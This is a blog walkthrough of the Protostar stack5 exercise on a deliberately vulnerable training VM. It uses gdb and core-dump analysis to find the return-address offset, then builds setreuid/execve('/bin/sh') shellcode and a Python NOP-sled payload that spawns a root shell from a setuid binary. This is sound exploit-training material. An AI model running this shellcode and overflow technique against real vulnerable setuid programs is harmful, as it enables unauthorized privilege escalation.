---
layout: post
title:  "Protostar stack5 challenge"
date:   2018-04-14 23:37:36 +0530
categories: exploit-exercises protostar stack5
---


Buffer overflow attack [Stack5][stack-5] but here we are not given a win free function to direct control to
So we will have to use shell code which should be called upon execution of the program.
{% highlight cpp %}
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>
int main(int argc, char **argv) {
  char buffer[64];
  gets(buffer);
}
{% endhighlight %}
As usual `gets` is the vulnerable function here.
As seen from stack4 exercise first we need to find where RET return address is located in main.
{% highlight nasm %}
$ gdb /opt/protostar/bin/stack5
(gdb) set disassembly-flavor intel
(gdb) disassemble main
Dump of assembler code for function main:
0x080483c4 <main+0>:    push   ebp
0x080483c5 <main+1>:    mov    ebp,esp
0x080483c7 <main+3>:    and    esp,0xfffffff0
0x080483ca <main+6>:    sub    esp,0x50
0x080483cd <main+9>:    lea    eax,[esp+0x10]
0x080483d1 <main+13>:   mov    DWORD PTR [esp],eax
0x080483d4 <main+16>:   call   0x80482e8 <gets@plt>
0x080483d9 <main+21>:   leave
0x080483da <main+22>:   ret
End of assembler dump.
{% endhighlight %}
`$ebp` is base pointer. `$esp` is stack pointer which points to top of stack
When a new function is called, the calling function `$ebp` is pushed onto the stack
{% highlight nasm %}0x080483c4 <main+0>:    push   ebp{% endhighlight %}
Then new $ebp points to current `$esp`
{% highlight nasm %}0x080483c5 <main+1>:    mov    ebp,esp{% endhighlight %}
Then space for local variables is created.
Also `$eip`(not seen here) points to current instruction pointer, ie the current
instruction being executed.
Now the RET address(where control should return after exiting main commonly
some C library) is stored just after where `$ebp` is stored.
We add few break points and
{% highlight nasm %}
(gdb) b *0x080483c4
Breakpoint 1 at 0x80483c4: file stack5/stack5.c, line 7.
(gdb) b *0x080483d4
Breakpoint 2 at 0x80483d4: file stack5/stack5.c, line 10.
(gdb) b *0x080483d9
Breakpoint 3 at 0x80483d9: file stack5/stack5.c, line 11.
{% endhighlight %}
Then run
{% highlight nasm %}
(gdb) r
Starting program: /opt/protostar/bin/stack5
Breakpoint 1, main (argc=1, argv=0xbffffd74) at stack5/stack5.c:7
7       stack5/stack5.c: No such file or directory.
        in stack5/stack5.c
(gdb) info r
eax            0xbffffd74       -1073742476
ecx            0x698c084a       1770784842
edx            0x1      1
ebx            0xb7fd7ff4       -1208123404
esp            0xbffffccc       0xbffffccc
ebp            0xbffffd48       0xbffffd48
esi            0x0      0
edi            0x0      0
eip            0x80483c4        0x80483c4 <main>
eflags         0x200246 [ PF ZF IF ID ]
cs             0x73     115
ss             0x7b     123
ds             0x7b     123
es             0x7b     123
fs             0x0      0
gs             0x33     51
{% endhighlight %}
Here we see $ebp has 0xbffffd78. This is $ebp value of caller
 which will be now pushed to stack. (0x080483c4 <main+0>:    push   ebp)
{% highlight nasm %}
(gdb) c
Continuing.
Breakpoint 2, 0x080483d4 in main (argc=1, argv=0xbffffd74) at stack5/stack5.c:10
10      in stack5/stack5.c
(gdb) infor
Undefined command: "infor".  Try "help".
(gdb) info r
eax            0xbffffc80       -1073742720
ecx            0x698c084a       1770784842
edx            0x1      1
ebx            0xb7fd7ff4       -1208123404
esp            0xbffffc70       0xbffffc70
ebp            0xbffffcc8       0xbffffcc8
esi            0x0      0
edi            0x0      0
eip            0x80483d4        0x80483d4 <main+16>
eflags         0x200282 [ SF IF ID ]
cs             0x73     115
ss             0x7b     123
ds             0x7b     123
es             0x7b     123
fs             0x0      0
gs             0x33     51
{% endhighlight %}
Here we see $ebp is 0xbffffcc8. This was due to `(mov    ebp,esp)`
and is basically where callers $ebp is stored.
This is break just before calling gets(buffer).
In intel the address of buffer is saved to top of stack $esp just before calling func.
So $esp points to buffer location ie $esp contain the location of buffer
{% highlight nasm %}
(gdb) x/x $esp
0xbffffc70:     0xbffffc80
{% endhighlight %}
That means buffer is located as 0xbffffc80.
Since gets would start input from this address, we attempt to over this buffer just
so that we RET is overwritten with our shellcode location. And when control returns from
main our shellcode is executed.
Start of RET is $ebp+4
So we need to overwrite dummy chars upto RET ie start-RET - start-buffer
ie 0xbffffcc8 + 4 - 0xbffffc80 = 76(base 10)
Ok continue
In a separate terminal and rerun with this as input
{% highlight nasm %}
$  perl -e 'print "A"x76 . "\xEF\xBE\xAD\xDE"' > temp.txt
(gdb) r < /home/user/temp.txt
Starting program: /opt/protostar/bin/stack5 < /home/user/temp.txt
Program received signal SIGSEGV, Segmentation fault.
0xdeadbeef in ?? ()
(gdb) info r
eax            0xbffffc80       -1073742720
ecx            0xbffffc80       -1073742720
edx            0xb7fd9334       -1208118476
ebx            0xb7fd7ff4       -1208123404
esp            0xbffffcd0       0xbffffcd0
ebp            0x41414141       0x41414141
esi            0x0      0
edi            0x0      0
eip            0xdeadbeef       0xdeadbeef
eflags         0x210246 [ PF ZF IF RF ID ]
cs             0x73     115
ss             0x7b     123
ds             0x7b     123
es             0x7b     123
fs             0x0      0
gs             0x33     51
{% endhighlight %}
We see $eip which is the return pointer is overwritten as 0xdeadbeef and we get SIGSEGV.
So we have 76 chars before RET where we can store our shell code or we can also store it after RET.
We will try to store it before RET.
First we begin by creating shell-code which would spawn a shell.
I used this link to get shell-code. [shellcode5.html][shellcode5]
{% highlight nasm %}
;shellex.asm
[SECTION wtext write]
global _start
;shellex.asm
section wtext write
global _start
_start:
    xor eax, eax
    mov al, 70                    ; setreuid is syscall 70
    xor ebx, ebx
    xor ecx, ecx
    int 0x80
    jmp short    mycall           ; Immediately jump to the call instruction
    shellcode:
        pop        ecx                ; Store the address of "/bin/sh" in ESI
        xor        eax, eax           ; Zero out EAX
        mov byte   [ecx + 7], al      ; Write the null byte at the end of the string
        mov dword  [ecx + 8],  esi    ; [ecx+8], i.e. the memory immediately below the string
                                      ;   "/bin/sh", will contain the array pointed to by the
                                      ;   second argument of execve(2); therefore we store in
                                      ;   [ecx+8] the address of the string...
        mov dword  [ecx + 12], eax    ; ...and in [ecx+12] the NULL pointer (EAX is 0)
        mov        al,  0xb           ; Store the number of the syscall (11) in EAX
        lea        ebx, [ecx]         ; Copy the address of the string in EBX
        lea        edx, [ecx + 12]    ; Third argument to execve(2) (NULL pointer)
        lea        ecx, [ecx + 8]     ; Second argument to execve(2)
        int        0x80               ; Execute the system call
    mycall:
        call       shellcode          ; Push the address of "/bin/sh" onto the stack
        db         "/bin/sh"
{% endhighlight %}
Most of the shellcode is same as given in link but i had to add [SECTION wtext write]
atop the code. Something to do with make stack section writable as mentioned here.
[Discussion in stackoverflow][so-discussion]
{%highlight shell%}
VirtualBox:~$ nasm -felf get_shell.asm
VirtualBox:~$ ld -melf_i386 -o get_shell get_shell.o
VirtualBox:~$ ./get_shell
{%endhighlight%}
So we get a shell now.
We need to get shell code as hex. Using objdump and regex dump from my SE course
{% highlight shell %}
madhurrawat@madhurrawrat-VirtualBox:~/Desktop/shellcode$ objdump -D ./get_shell.o |grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'
"\x31\xc0\xb0\x46\x31\xdb\x31\xc9\xcd\x80\xeb\x18\x59\x31\xc0\x88\x41\x07\x89\x71\x08\x89\x41\x0c\xb0\x0b\x8d\x19\x8d\x51\x0c\x8d\x49\x08\xcd\x80\xe8\xe3\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68"
{% endhighlight %}
So we prepare a python script to prepare payload.
{% highlight python %}
#!/usr/bin/env python
offset = 72
shellcode = "\x31\xc0\xb0\x46\x31\xdb\x31\xc9\xcd\x80\xeb\x18\x59\x31 \
\xc0\x88\x41\x07\x89\x71\x08\x89\x41\x0c\xb0\x0b\x8d\x19\x8d\x51\x0c\x8d \
\x49\x08\xcd\x80\xe8\xe3\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68"
nopsled = "\x90" * (offset - len(shellcode))
ret = "\xb0\xfc\xff\xbf"
payload = nopsled + shellcode + "JJJJ" + ret
print payload
{% endhighlight %}
So basically we are overwriting $ebp with "JJJJ" ie frame pointer.
nopsled + shellcode should total 72.
BUT wait why is ret here as 0xbffff790. Shouldn't it be start of our
buffer ie 0xbffffc80. Well i tried with RET as 0xbffffc80 but got SEG
Maybe because of this reason mentioned in [link][core-need]
`| In gdb stack addresses aren't the same as in a live run !!!    |`
So better we analyze core file:
So we login as root in protostar
{% highlight shell %}
root@protostar:/# echo 2 > /proc/sys/fs/suid_dumpable
root@protostar:/# cat /proc/sys/kernel/core_pattern
/tmp/core.%s.%e.%p
root@protostar:/# ulimit -c unlimited
root@protostar:/# cd /opt/protostar/bin
root@protostar:/opt/protostar/bin#  perl -e 'print "A"x76 . "\xEF\xBE\xAD\xDE"' | ./stack5
Segmentation fault (core dumped)
root@protostar:/opt/protostar/bin# ls /tmp
core.11.stack5.1817
root@protostar:/opt/protostar/bin# gdb -q -c /tmp/core.11.stack5.1817
{% endhighlight %}
{% highlight nasm %}
Core was generated by `./stack5'.
Program terminated with signal 11, Segmentation fault.
#0  0xdeadbeef in ?? ()
(gdb) info r
eax            0xbffffcb0       -1073742672
ecx            0xbffffcb0       -1073742672
edx            0xb7fd9334       -1208118476
ebx            0xb7fd7ff4       -1208123404
esp            0xbffffd00       0xbffffd00
ebp            0x41414141       0x41414141
esi            0x0      0
edi            0x0      0
eip            0xdeadbeef       0xdeadbeef
eflags         0x10246  [ PF ZF IF RF ]
cs             0x73     115
ss             0x7b     123
ds             0x7b     123
es             0x7b     123
fs             0x0      0
gs             0x33     51
{% endhighlight %}
Ok. so we overwrote RET properly coz $eip is 0xdeadbeef
Further we examine are where we wrote A 76 times
{% highlight nasm %}
(gdb) x/30x $esp-96
0xbffffca0:     0xbffffcb0      0xb7ec6165      0xbffffcb8      0xb7eada75
0xbffffcb0:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffffcc0:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffffcd0:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffffce0:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffffcf0:     0x41414141      0x41414141      0x41414141      0xdeadbeef
0xbffffd00:     0x00000000      0xbffffda4      0xbffffdac      0xb7fe1848
0xbffffd10:     0xbffffd60      0xffffffff
{% endhighlight %}
So we see in coredumps buffer is starting from 0xbffffcb0.
Since we will be starting from 0xbffffcb0 our RET should now point to it, ie
beginning of our shell code.
{% highlight shell %}
$ python pwn5.py > payload5
$  (cat payload5; cat) | /opt/protostar/bin/stack5
id
uid=0(root) gid=1001(user) groups=0(root),1001(user)
whoami
root
{% endhighlight %}
So we successfully spawned a shell as root.
We could spawn a shell as root coz this is a setuid program.
[stack-5]: https://exploit-exercises.com/protostar/stack5/
[shellcode5]: http://www.kernel-panic.it/security/shellcode/shellcode5.html
[so-discussion]: https://chat.stackoverflow.com/rooms/91636/discussion-between-jester-and-czifro
[core-need]: https://github.com/flankerhqd/protostar-solutions/blob/master/Stack%205/stack5.txt
